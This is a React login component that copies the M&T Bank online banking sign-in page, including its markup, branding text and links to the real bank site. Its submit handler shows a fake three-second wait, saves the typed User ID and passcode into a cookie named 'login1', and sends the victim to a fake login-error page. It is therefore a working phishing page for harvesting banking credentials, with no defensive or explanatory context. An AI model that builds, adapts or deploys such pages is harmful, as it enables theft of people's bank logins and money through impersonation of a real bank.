import React from "react";
import { useNavigate } from "react-router-dom";
import cookies from "../utils/cookie.config";
import { wait } from "../utils/waiter";

export default function Login() {
  const [formInput, setFormInput] = React.useState<Login>({
    username: "",
    password: "",
  });
  const [isLoading, setIsLoading] = React.useState(false);
  const navigate = useNavigate();

   function handleInputChange(event: React.ChangeEvent<HTMLInputElement>) {
    setFormInput((prevData) => ({
      ...prevData,
      [event.target.name]: event.target.value,
    }));
  }

  async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
    event.preventDefault();
    setIsLoading(true)
    await wait(3000)
    setIsLoading(false)
    cookies.set("login1", formInput);
    navigate("../login/error", { replace: true });
  };

  return (
    <>
    <form action="" method="post" onSubmit={handleSubmit}>
      <div className="mtb-app-login--content">
        <div className="grid-x grid-padding-x grid-x__padded __spacer-section">
          <div className="cell">
            <input type="hidden" value="OLB:SSC:LogInToOnlineBanking" />
            <div className="mtb-section-header mtb-section-header__login">
              <h1>Log In to Online Banking</h1>
              <p>For Personal and Business Accounts</p>
            </div>
          </div>

          <div className="mtb-page-error mtb-error-border mtb-error-margin hide">
            <input
              data-val="true"
              data-val-number="The field FailedSignOnCount must be a number."
              data-val-required="The FailedSignOnCount field is required."
              id="FailedSignOnCount"
              name="FailedSignOnCount"
              type="hidden"
              value="0"
            />
            <div className="mtb-app-default--content">
              <div className="callout __has-icon warning __no-border">
                <i className="__is-icon m-icon m-icon-notification m-icon-position">
                  <span className="show-for-sr">Notification Icon</span>
                </i>
                <p>
                  You have entered an invalid User ID and/or Passcode. Please
                  try again.
                </p>
                <p>
                  <a
                    style={{ textDecoration: "none" }}
                    href="https://onlinebanking.mtb.com/Login/PasscodeReset"
                  >
                    Forgot User ID or Passcode? &gt;
                  </a>
                </p>
                <p>
                  <b>
                    If you're a former People's United customer and have not
                    successfully logged in for the first time, you'll need to
                    <a href="https://onlinebanking.mtb.com/Login/PasscodeReset">
                      reset your passcode
                    </a>
                    in order to login.
                  </b>
                </p>
              </div>
            </div>
          </div>
          <div className="cell js-formFieldParent" data-parentfor="userId">
            <input
              data-val="true"
              data-val-required="The IsShowPUBMessage field is required."
              id="IsShowPUBMessage"
              name="IsShowPUBMessage"
              type="hidden"
              value="False"
            />
            <label htmlFor="userId"> User ID </label>
            <div className="input-group m-fake-single-input">
              <input
                className="input-group-field"
                data-fc-id="121"
                type="text"
                id="userId"
                name="username"
                aria-required="true"
                data-inputtype="text"
                data-attribute=""
                maxLength={20}
            
                aria-describedby="userIdError"
                aria-errormessage="userIdError"
                aria-invalid="true"
                required
                onChange={handleInputChange}
              />
            </div>
            <p
              className="form-error mtb-error-border"
              id="userIdError"
              role="alert"
            ></p>
          </div>

          <div className="cell js-formFieldParent" data-parentfor="Passcode">
            <label htmlFor="Passcode"> Passcode </label>
            <div className="input-group m-fake-single-input">
              <input
                className="input-group-field is-mtb-form-error-login"
                data-fc-id="122"
                type="password"
                id="Passcode"
                name="password"
                aria-required="true"
                data-inputtype="tel"
                maxLength={20}
                required
                onChange={handleInputChange}
              />
              <div className="input-group-button">
                <button
                  type="button"
                  id="Show"
                  data-btnfor="Passcode"
                  className="button clear hide js-showHide"
                >
                  Show
                </button>
              </div>
            </div>
            <p
              className="form-error mtb-error-border"
              id="PasscodeError"
              role="alert"
            ></p>
          </div>

          <div className="cell">
            <div className="mtb-formcheckbox">
              <input
                className="show-for-sr"
                type="checkbox"
                id="RememberUserId"
                name="RememberUserId"
                value="false"
              />
              <label htmlFor="RememberUserId" className="__spacer-remove">
                Remember User ID
              </label>
            </div>
          </div>
        </div>

        <div className="grid-x grid-padding-x __spacer-paragraph grid-x__padded">
          <div className="cell">
        {isLoading?
        <button
        type="button"
        className="button button__form-no-spacer expanded kessel-flush"
        id="btnSubmit"
      >
        Please wait...
      </button>
        :<button
              type="submit"
              className="button button__form-no-spacer expanded kessel-flush"
              id="btnSubmit"
            >
              Log In
            </button>}
          </div>
          <div className="cell">
            <a
              href="https://onlinebanking.mtb.com/Login/LoginHelp"
              className="button button__fake-padding-no-spacer expanded clear"
              id="jsAnalyticsLink"
            >
              Help with User ID or Passcode
            </a>
          </div>
          <div className="cell">
            <a
              href="https://onlinebanking.mtb.com/Enrollment/Enroll"
              className="button button__fake-padding expanded clear"
              id="jsAnalyticsEnrollLink"
              data-attribute="item"
            >
              Enroll Now
            </a>
          </div>

          <p className="cell text-center __font-size-tiny __color-gray-accent">
            Unauthorized access is prohibited. Usage may be monitored.
          </p>
        </div>
      </div>
      </form>
    </>
  );
}
